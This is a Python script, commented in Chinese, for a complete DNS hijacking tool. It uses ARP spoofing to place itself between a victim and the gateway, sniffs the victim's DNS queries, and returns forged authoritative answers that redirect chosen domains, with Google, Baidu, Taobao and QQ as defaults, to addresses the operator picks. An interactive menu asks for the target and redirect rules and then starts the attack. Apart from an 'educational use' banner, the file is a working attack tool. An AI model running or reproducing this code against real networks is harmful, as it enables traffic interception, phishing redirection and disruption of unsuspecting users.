#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
可靠DNS劫持工具 - 针对现代网络环境优化
解决传统DNS劫持失败的问题
"""

import socket
import struct
import threading
import time
import sys
import os
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import subprocess

# 检查scapy可用性
try:
    from scapy.all import *
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] scapy不可用，部分功能受限")

class ReliableDNSHijack:
    """可靠DNS劫持工具"""
    
    def __init__(self):
        self.is_running = False
        self.stats = {
            'start_time': None,
            'hijacked_queries': 0,
            'total_queries': 0,
            'failed_attempts': 0
        }
        
        # 劫持规则
        self.hijack_rules = {
            'exact': {},
            'wildcard': [],
            'regex': []
        }
        
        # 默认劫持规则
        self.setup_default_rules()
        
        # 网络配置
        self.interface = None
        self.target_ip = None
        
        print("[+] 可靠DNS劫持工具初始化完成")
    
    def setup_default_rules(self):
        """设置默认劫持规则"""
        # 常用网站劫持
        default_rules = {
            'www.google.com': '127.0.0.1',
            'www.baidu.com': '127.0.0.1',
            'www.taobao.com': '127.0.0.1',
            'www.qq.com': '127.0.0.1',
            '*.google.com': '127.0.0.1',
            '*.baidu.com': '127.0.0.1'
        }
        
        for domain, redirect_ip in default_rules.items():
            if '*' in domain:
                self.hijack_rules['wildcard'].append((domain.replace('*', ''), redirect_ip))
            else:
                self.hijack_rules['exact'][domain] = redirect_ip
    
    def add_hijack_rule(self, domain: str, redirect_ip: str, rule_type: str = 'exact'):
        """添加劫持规则"""
        if rule_type == 'exact':
            self.hijack_rules['exact'][domain] = redirect_ip
        elif rule_type == 'wildcard':
            self.hijack_rules['wildcard'].append((domain, redirect_ip))
        
        print(f"[+] 添加劫持规则: {domain} -> {redirect_ip} ({rule_type})")
    
    def should_hijack(self, domain: str) -> Optional[str]:
        """判断是否应该劫持该域名"""
        # 精确匹配
        if domain in self.hijack_rules['exact']:
            return self.hijack_rules['exact'][domain]
        
        # 通配符匹配
        for prefix, redirect_ip in self.hijack_rules['wildcard']:
            if domain.endswith(prefix):
                return redirect_ip
        
        return None
    
    def create_dns_response(self, original_packet, redirect_ip: str):
        """创建DNS欺骗响应包"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            # 提取原始DNS查询
            if original_packet.haslayer(DNS):
                dns_query = original_packet[DNS]
                
                # 创建DNS响应包
                dns_response = (
                    IP(src=original_packet[IP].dst, dst=original_packet[IP].src) /
                    UDP(sport=original_packet[UDP].dport, dport=original_packet[UDP].sport) /
                    DNS(
                        id=dns_query.id,
                        qr=1,  # 响应标志
                        aa=1,  # 权威应答
                        qd=dns_query.qd,  # 查询部分
                        an=DNSRR(
                            rrname=dns_query.qd.qname,
                            type='A',
                            ttl=300,
                            rdata=redirect_ip
                        )
                    )
                )
                
                return dns_response
        except Exception as e:
            print(f"[-] 创建DNS响应包失败: {e}")
        
        return None
    
    def dns_packet_handler(self, packet):
        """DNS包处理函数"""
        if not self.is_running:
            return
        
        try:
            if packet.haslayer(DNS) and packet.haslayer(IP):
                dns_layer = packet[DNS]
                
                # 只处理DNS查询（QR=0）
                if dns_layer.qr == 0 and dns_layer.qd:
                    query_name = dns_layer.qd.qname.decode('utf-8').rstrip('.')
                    
                    self.stats['total_queries'] += 1
                    
                    # 检查是否应该劫持
                    redirect_ip = self.should_hijack(query_name)
                    
                    if redirect_ip:
                        print(f"[+] 劫持DNS查询: {query_name} -> {redirect_ip}")
                        
                        # 创建欺骗响应
                        spoofed_response = self.create_dns_response(packet, redirect_ip)
                        
                        if spoofed_response:
                            try:
                                send(spoofed_response, verbose=False)
                                self.stats['hijacked_queries'] += 1
                                print(f"    ✓ 成功发送欺骗响应")
                            except Exception as e:
                                print(f"    ✗ 发送欺骗响应失败: {e}")
                                self.stats['failed_attempts'] += 1
                    else:
                        # 显示正常查询
                        if self.stats['total_queries'] % 10 == 0:
                            print(f"[~] 正常DNS查询: {query_name}")
                            
        except Exception as e:
            print(f"[-] DNS包处理错误: {e}")
    
    def start_arp_spoofing(self, target_ip: str, gateway_ip: str):
        """开始ARP欺骗（确保流量经过本机）"""
        if not SCAPY_AVAILABLE:
            print("[-] scapy不可用，跳过ARP欺骗")
            return False
        
        print(f"[+] 开始ARP欺骗: {target_ip} <-> {gateway_ip}")
        
        def arp_spoof():
            while self.is_running:
                try:
                    # 告诉目标：我是网关
                    arp_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip)
                    send(arp_to_target, verbose=False)
                    
                    # 告诉网关：我是目标
                    arp_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip)
                    send(arp_to_gateway, verbose=False)
                    
                    time.sleep(1)
                except Exception as e:
                    print(f"[-] ARP欺骗错误: {e}")
                    time.sleep(2)
        
        arp_thread = threading.Thread(target=arp_spoof)
        arp_thread.daemon = True
        arp_thread.start()
        
        return True
    
    def start_dns_hijack(self, target_ip: str, gateway_ip: str = None, interface: str = None):
        """开始DNS劫持攻击"""
        if not SCAPY_AVAILABLE:
            print("[-] scapy不可用，无法进行DNS劫持")
            return False
        
        print(f"[+] 开始可靠DNS劫持攻击")
        print(f"    目标IP: {target_ip}")
        print(f"    劫持规则: {len(self.hijack_rules['exact'])} 条精确 + {len(self.hijack_rules['wildcard'])} 条通配符")
        
        self.is_running = True
        self.target_ip = target_ip
        self.stats['start_time'] = datetime.now()
        self.stats['hijacked_queries'] = 0
        self.stats['total_queries'] = 0
        self.stats['failed_attempts'] = 0
        
        try:
            # 如果提供了网关，先进行ARP欺骗
            if gateway_ip:
                self.start_arp_spoofing(target_ip, gateway_ip)
            
            # DNS嗅探过滤器 - 更宽松的过滤器
            filter_str = "udp port 53"
            if target_ip:
                filter_str += f" and host {target_ip}"
            
            print(f"[+] 开始嗅探DNS流量 (过滤器: {filter_str})")
            print("[!] 等待DNS查询...")
            
            # 启动嗅探
            sniff(
                filter=filter_str,
                prn=self.dns_packet_handler,
                store=0,
                iface=interface
            )
            
            return True
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断DNS劫持")
            return False
        except Exception as e:
            print(f"[-] DNS劫持失败: {e}")
            return False
        finally:
            self.is_running = False
            self.show_final_stats()
    
    def show_final_stats(self):
        """显示最终统计信息"""
        if self.stats['start_time']:
            duration = datetime.now() - self.stats['start_time']
            print(f"\n[=] 攻击统计:")
            print(f"    持续时间: {duration}")
            print(f"    总查询数: {self.stats['total_queries']}")
            print(f"    劫持成功: {self.stats['hijacked_queries']}")
            print(f"    失败尝试: {self.stats['failed_attempts']}")
            
            if self.stats['total_queries'] > 0:
                success_rate = (self.stats['hijacked_queries'] / self.stats['total_queries']) * 100
                print(f"    成功率: {success_rate:.1f}%")
    
    def network_diagnostics(self):
        """网络诊断工具"""
        print("\n[🔧] 网络诊断:")
        
        # 检查网络连接
        try:
            # 获取本机IP
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"    本机IP: {local_ip}")
            
            # 检查默认网关
            result = subprocess.run(['route', 'print'], capture_output=True, text=True)
            if '0.0.0.0' in result.stdout:
                for line in result.stdout.split('\n'):
                    if '0.0.0.0' in line and 'On-link' not in line:
                        parts = line.split()
                        if len(parts) > 2:
                            print(f"    默认网关: {parts[2]}")
                            break
            
        except Exception as e:
            print(f"    诊断错误: {e}")

def main():
    """主函数"""
    print("=" * 60)
    print("            可靠DNS劫持工具")
    print("              (教育用途)")
    print("=" * 60)
    
    if not SCAPY_AVAILABLE:
        print("[!] 需要安装scapy: pip install scapy")
        return
    
    # 检查管理员权限
    try:
        if os.name == 'nt':  # Windows
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] 建议以管理员权限运行以获得最佳效果")
    except:
        pass
    
    hijack_tool = ReliableDNSHijack()
    
    # 网络诊断
    hijack_tool.network_diagnostics()
    
    # 用户输入目标
    target_ip = input("\n[?] 输入目标IP地址: ").strip()
    gateway_ip = input("[?] 输入网关IP地址 (可选): ").strip() or None
    
    if not target_ip:
        print("[-] 必须提供目标IP地址")
        return
    
    # 添加自定义劫持规则
    print("\n[?] 添加自定义劫持规则 (输入空行结束):")
    while True:
        domain = input("    域名: ").strip()
        if not domain:
            break
        redirect_ip = input("    重定向到IP: ").strip() or "127.0.0.1"
        hijack_tool.add_hijack_rule(domain, redirect_ip)
    
    print(f"\n[!] 即将开始DNS劫持攻击")
    print(f"    目标: {target_ip}")
    print(f"    网关: {gateway_ip or '无'}")
    
    confirm = input("确认开始? (y/N): ").strip().lower()
    if confirm != 'y':
        print("[-] 操作取消")
        return
    
    # 开始攻击
    try:
        hijack_tool.start_dns_hijack(target_ip, gateway_ip)
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()